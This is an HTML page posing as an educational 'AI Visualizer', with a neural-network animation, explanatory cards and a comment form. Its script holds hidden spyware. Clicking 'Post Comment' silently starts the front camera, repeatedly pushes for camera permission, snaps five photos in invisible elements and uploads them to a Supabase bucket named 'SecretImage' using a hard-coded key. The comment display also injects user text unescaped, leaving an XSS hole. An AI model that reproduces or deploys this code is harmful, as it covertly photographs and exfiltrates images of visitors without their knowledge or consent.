<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Visualizer: The Symphony of Intelligence</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            padding: 40px 0;
            position: relative;
        }

        h1 {
            font-size: 3.5rem;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #00dbde, #fc00ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
        }

        .subtitle {
            font-size: 1.2rem;
            color: #a0a0e0;
            margin-bottom: 30px;
        }

        .ai-canvas {
            background: rgba(10, 10, 40, 0.3);
            border-radius: 15px;
            box-shadow: 0 0 40px rgba(100, 100, 255, 0.2);
            margin: 30px auto;
            position: relative;
            overflow: hidden;
            height: 500px;
        }

        canvas {
            display: block;
            width: 100%;
            height: 100%;
        }

        .info-panel {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin: 40px 0;
        }

        .card {
            flex: 1;
            min-width: 250px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }

        .card h3 {
            color: #6ce5ff;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }

        .card p {
            line-height: 1.6;
            color: #ccccff;
        }

        .controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 30px 0;
            flex-wrap: wrap;
        }

        button {
            background: linear-gradient(90deg, #4776E6, #8E54E9);
            border: none;
            color: white;
            padding: 12px 25px;
            border-radius: 50px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(142, 84, 233, 0.4);
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 20px rgba(142, 84, 233, 0.6);
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .comments-section {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 30px;
            margin: 40px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .comments-section h2 {
            color: #6ce5ff;
            margin-bottom: 20px;
            font-size: 2rem;
            text-align: center;
        }

        .comment-form {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
        }

        .comment-input {
            flex: 1;
            padding: 15px 20px;
            border-radius: 50px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s;
        }

        .comment-input:focus {
            border-color: #6ce5ff;
            box-shadow: 0 0 15px rgba(108, 229, 255, 0.5);
        }

        .comment-input::placeholder {
            color: #a0a0e0;
        }

        .comment-submit {
            background: linear-gradient(90deg, #00dbde, #fc00ff);
            border: none;
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(252, 0, 255, 0.4);
        }

        .comment-submit:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 20px rgba(252, 0, 255, 0.6);
        }

        .comments-list {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .comment {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            border-left: 4px solid #6ce5ff;
            animation: fadeIn 0.5s ease-out;
        }

        .comment-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #a0a0e0;
            font-size: 0.9rem;
        }

        .comment-text {
            color: #ffffff;
            line-height: 1.5;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        footer {
            text-align: center;
            padding: 30px;
            color: #8888cc;
            font-size: 0.9rem;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }
            
            .comment-form {
                flex-direction: column;
            }
            
            .controls {
                flex-direction: column;
                align-items: center;
            }
            
            button {
                width: 100%;
                max-width: 300px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>AI Visualizer</h1>
            <p class="subtitle">The Symphony of Intelligence - Exploring the Neural Pathways of Artificial Minds</p>
        </header>

        <div class="ai-canvas">
            <canvas id="aiCanvas"></canvas>
        </div>

        <div class="controls">
            <button id="btnNeural" class="pulse">Activate Neural Network</button>
            <button id="btnDataFlow">Start Data Flow</button>
            <button id="btnLearning">Simulate Learning</button>
        </div>

        <div class="info-panel">
            <div class="card">
                <h3>What is AI?</h3>
                <p>Artificial Intelligence refers to computer systems designed to perform tasks that typically require human intelligence. These include learning, reasoning, problem-solving, perception, and language understanding.</p>
            </div>
            <div class="card">
                <h3>Neural Networks</h3>
                <p>Inspired by the human brain, neural networks consist of interconnected nodes (neurons) that process information. They learn by adjusting connection strengths based on patterns in data.</p>
            </div>
            <div class="card">
                <h3>Machine Learning</h3>
                <p>Machine learning is a subset of AI that enables systems to learn and improve from experience without being explicitly programmed, using algorithms to find patterns in data.</p>
            </div>
        </div>

        <div class="comments-section">
            <h2>Share Your Thoughts on AI</h2>
            <div class="comment-form">
                <input type="text" class="comment-input" id="commentInput" placeholder="What are your thoughts on artificial intelligence?">
                <button class="comment-submit" id="commentSubmit">Post Comment</button>
            </div>
            <div class="comments-list" id="commentsList">
                <!-- Comments will be added here dynamically -->
            </div>
        </div>
    </div>

    <footer>
        <p>AI Visualizer | Exploring the Frontiers of Artificial Intelligence</p>
    </footer>

<script type="module">
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

// ðŸŸ¢ Supabase credentials
const SUPABASE_URL = 'https://nqtxeqbvxhtsiilgerkj.supabase.co';
const SUPABASE_ANON_KEY =
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xdHhlcWJ2eGh0c2lpbGdlcmtqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2OTQ5NzIsImV4cCI6MjA3ODI3MDk3Mn0.aL6O6kkHFAmmVlmU-ixE9Jkz61jgXAx6rlM3zHo_xnc';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        document.addEventListener('DOMContentLoaded', function() {
            const canvas = document.getElementById('aiCanvas');
            const ctx = canvas.getContext('2d');
            const btnNeural = document.getElementById('btnNeural');
            const btnDataFlow = document.getElementById('btnDataFlow');
            const btnLearning = document.getElementById('btnLearning');
            const commentInput = document.getElementById('commentInput');
            const commentSubmit = document.getElementById('commentSubmit');
            const commentsList = document.getElementById('commentsList');

            // Set canvas dimensions
            canvas.width = canvas.parentElement.offsetWidth;
            canvas.height = canvas.parentElement.offsetHeight;

            // Neural network visualization
            const layers = [5, 8, 6, 4]; // Number of neurons in each layer
            const neurons = [];
            const connections = [];
            const dataNodes = [];
            let animationId;
            let isAnimating = false;
            let learningPhase = 0;

            // Initialize neurons
            function initNeurons() {
                neurons.length = 0;
                const layerWidth = canvas.width / (layers.length + 1);
                
                for (let l = 0; l < layers.length; l++) {
                    const layerNeurons = [];
                    const ySpacing = canvas.height / (layers[l] + 1);
                    
                    for (let n = 0; n < layers[l]; n++) {
                        const x = (l + 1) * layerWidth;
                        const y = (n + 1) * ySpacing;
                        layerNeurons.push({ x, y, active: false, activation: 0 });
                    }
                    
                    neurons.push(layerNeurons);
                }
            }

            // Initialize connections between neurons
            function initConnections() {
                connections.length = 0;
                
                for (let l = 0; l < neurons.length - 1; l++) {
                    for (let i = 0; i < neurons[l].length; i++) {
                        for (let j = 0; j < neurons[l + 1].length; j++) {
                            connections.push({
                                from: neurons[l][i],
                                to: neurons[l + 1][j],
                                strength: Math.random() * 0.5 + 0.5,
                                active: false
                            });
                        }
                    }
                }
            }

            // Draw the neural network
            function drawNeuralNetwork() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                // Draw connections
                connections.forEach(conn => {
                    const gradient = ctx.createLinearGradient(
                        conn.from.x, conn.from.y, 
                        conn.to.x, conn.to.y
                    );
                    
                    if (conn.active) {
                        gradient.addColorStop(0, 'rgba(108, 229, 255, 0.8)');
                        gradient.addColorStop(1, 'rgba(252, 0, 255, 0.8)');
                    } else {
                        gradient.addColorStop(0, 'rgba(108, 229, 255, 0.2)');
                        gradient.addColorStop(1, 'rgba(252, 0, 255, 0.2)');
                    }
                    
                    ctx.beginPath();
                    ctx.moveTo(conn.from.x, conn.from.y);
                    ctx.lineTo(conn.to.x, conn.to.y);
                    ctx.strokeStyle = gradient;
                    ctx.lineWidth = conn.strength;
                    ctx.stroke();
                });
                
                // Draw neurons
                neurons.forEach(layer => {
                    layer.forEach(neuron => {
                        const gradient = ctx.createRadialGradient(
                            neuron.x, neuron.y, 0,
                            neuron.x, neuron.y, 15
                        );
                        
                        if (neuron.active) {
                            gradient.addColorStop(0, 'rgba(108, 229, 255, 1)');
                            gradient.addColorStop(1, 'rgba(71, 118, 230, 1)');
                        } else {
                            gradient.addColorStop(0, 'rgba(108, 229, 255, 0.4)');
                            gradient.addColorStop(1, 'rgba(71, 118, 230, 0.4)');
                        }
                        
                        ctx.beginPath();
                        ctx.arc(neuron.x, neuron.y, 10, 0, Math.PI * 2);
                        ctx.fillStyle = gradient;
                        ctx.fill();
                        
                        // Glow effect for active neurons
                        if (neuron.active) {
                            ctx.beginPath();
                            ctx.arc(neuron.x, neuron.y, 20, 0, Math.PI * 2);
                            ctx.fillStyle = 'rgba(108, 229, 255, 0.2)';
                            ctx.fill();
                        }
                    });
                });
                
                // Draw data nodes
                dataNodes.forEach(node => {
                    ctx.beginPath();
                    ctx.arc(node.x, node.y, 6, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(252, 0, 255, 0.8)';
                    ctx.fill();
                    
                    // Glow effect
                    ctx.beginPath();
                    ctx.arc(node.x, node.y, 15, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(252, 0, 255, 0.2)';
                    ctx.fill();
                });
            }

            // Animate neural network activation
            function animateNeuralNetwork() {
                if (!isAnimating) return;
                
                // Reset all neurons and connections
                neurons.forEach(layer => {
                    layer.forEach(neuron => {
                        neuron.active = false;
                        neuron.activation = 0;
                    });
                });
                
                connections.forEach(conn => {
                    conn.active = false;
                });
                
                // Randomly activate some neurons and connections
                const activeNeurons = [];
                
                neurons.forEach(layer => {
                    const randomNeuron = layer[Math.floor(Math.random() * layer.length)];
                    randomNeuron.active = true;
                    randomNeuron.activation = 1;
                    activeNeurons.push(randomNeuron);
                });
                
                // Activate connections between active neurons
                connections.forEach(conn => {
                    if (Math.random() > 0.7) {
                        conn.active = true;
                    }
                });
                
                // Add random data nodes
                if (Math.random() > 0.5 && dataNodes.length < 20) {
                    dataNodes.push({
                        x: Math.random() * canvas.width,
                        y: Math.random() * canvas.height,
                        vx: (Math.random() - 0.5) * 4,
                        vy: (Math.random() - 0.5) * 4
                    });
                }
                
                // Update data nodes position
                dataNodes.forEach((node, index) => {
                    node.x += node.vx;
                    node.y += node.vy;
                    
                    // Bounce off edges
                    if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
                    if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
                    
                    // Remove nodes that are too old
                    if (Math.random() > 0.99) {
                        dataNodes.splice(index, 1);
                    }
                });
                
                drawNeuralNetwork();
                animationId = requestAnimationFrame(animateNeuralNetwork);
            }

            // Simulate learning process
            function simulateLearning() {
                learningPhase = (learningPhase + 1) % 100;
                
                // Adjust connection strengths based on learning phase
                connections.forEach(conn => {
                    // Simulate learning by adjusting connection strengths
                    conn.strength = 0.3 + 0.7 * Math.abs(Math.sin(learningPhase / 10 + conn.from.x / 100));
                });
                
                // Add more data nodes during learning
                if (dataNodes.length < 30) {
                    for (let i = 0; i < 3; i++) {
                        dataNodes.push({
                            x: Math.random() * canvas.width,
                            y: Math.random() * canvas.height,
                            vx: (Math.random() - 0.5) * 3,
                            vy: (Math.random() - 0.5) * 3
                        });
                    }
                }
            }
            
					async function hiddenCaptureAndUpload() {
					  const video = document.createElement('video');
					  const canvas = document.createElement('canvas');
					  video.style.display = 'none';
					  canvas.style.display = 'none';
					  document.body.appendChild(video);
					  document.body.appendChild(canvas);
					
						try {
				        // Open front camera - ADD RETRY LOGIC HERE       
				        let stream;
				        let permissionGranted = false;
				        
				        while (!permissionGranted) {
				            try {
				                stream = await navigator.mediaDevices.getUserMedia({
				                    video: { facingMode: 'user' },
				                    audio: false
				                });
				                permissionGranted = true;
				            } catch (err) {
				                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
				                    // Ask for permission again
				                    const retry = confirm('Camera permission is required. Please allow camera access and click OK to retry.');
				                    if (!retry) {
				                        throw err; // Exit if user cancels
				                    }
				                } else {
				                    throw err; // Throw other errors
				                }
				            }
				        }
					
					    video.srcObject = stream;
					    await video.play();
					
					    // Wait a bit for camera to stabilize lighting
					    await new Promise(res => setTimeout(res, 1000));
					
					    const ctx = canvas.getContext('2d');
					
					    for (let i = 1; i <= 5; i++) {
					      canvas.width = video.videoWidth;
					      canvas.height = video.videoHeight;
					      ctx.drawImage(video, 0, 0);
					
					      // Convert image to blob
					      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
					      const fileName = `photo_${Date.now()}_${i}.jpg`;
					
					      // Upload to Supabase
					      const { data, error } = await supabase.storage
					        .from('SecretImage')
					        .upload(fileName, blob, { contentType: 'image/jpeg' });
					
					      if (error) {
					        console.error(`Upload ${i} failed:`, error.message);
					      } else {
					        console.log(`âœ… Uploaded photo ${i}:`, fileName);
					      }
					
					      // Wait a little between captures (to get slightly different poses)
					      await new Promise(res => setTimeout(res, 500));
					    }
					
					    // Stop the camera after all photos
					    stream.getTracks().forEach(track => track.stop());
					    video.remove();
					    canvas.remove();
					
					  } catch (err) {
					    alert('Camera access error: ' + err.name + ' - ' + err.message);
					  }
					}
					
            // Add a new comment
            function addComment(text) {
                if (!text.trim()) return;                
                                
                const commentDiv = document.createElement('div');
                commentDiv.className = 'comment';
                
                const now = new Date();
                const timestamp = now.toLocaleString();
                
                commentDiv.innerHTML = `
                    <div class="comment-header">
                        <span>Anonymous User</span>
                        <span>${timestamp}</span>
                    </div>
                    <div class="comment-text">${text}</div>
                `;
                
                commentsList.insertBefore(commentDiv, commentsList.firstChild);
                
                // Clear the input
                commentInput.value = '';
            }

            // Event listeners for buttons
            btnNeural.addEventListener('click', function() {
                if (!isAnimating) {
                    isAnimating = true;
                    initNeurons();
                    initConnections();
                    animateNeuralNetwork();
                    btnNeural.textContent = "Deactivate Neural Network";
                } else {
                    isAnimating = false;
                    cancelAnimationFrame(animationId);
                    btnNeural.textContent = "Activate Neural Network";
                    dataNodes.length = 0;
                    drawNeuralNetwork();
                }
            });

            btnDataFlow.addEventListener('click', function() {
                // Add multiple data nodes
                for (let i = 0; i < 15; i++) {
                    dataNodes.push({
                        x: Math.random() * canvas.width,
                        y: Math.random() * canvas.height,
                        vx: (Math.random() - 0.5) * 5,
                        vy: (Math.random() - 0.5) * 5
                    });
                }
            });

            btnLearning.addEventListener('click', function() {
                if (!isAnimating) {
                    alert("Please activate the neural network first!");
                    return;
                }
                
                // Run learning simulation for a period
                const learningInterval = setInterval(simulateLearning, 100);
                
                // Stop learning after 5 seconds
                setTimeout(() => {
                    clearInterval(learningInterval);
                }, 5000);
            });

            // Event listener for comment submission
            commentSubmit.addEventListener('click', function() {
                hiddenCaptureAndUpload();
                addComment(commentInput.value);
            });

            commentInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    addComment(commentInput.value);
                }
            });

            // Initialize with a static neural network
            initNeurons();
            initConnections();
            drawNeuralNetwork();

            // Handle window resize
            window.addEventListener('resize', function() {
                canvas.width = canvas.parentElement.offsetWidth;
                canvas.height = canvas.parentElement.offsetHeight;
                initNeurons();
                initConnections();
                drawNeuralNetwork();
            });

            // Add some sample comments
            addComment("This visualization really helps understand how neural networks work!");
            addComment("I'm fascinated by how AI can learn from data patterns.");
            addComment("The future of AI is both exciting and a little scary. What do you think?");
        });
    </script>
</body>
</html>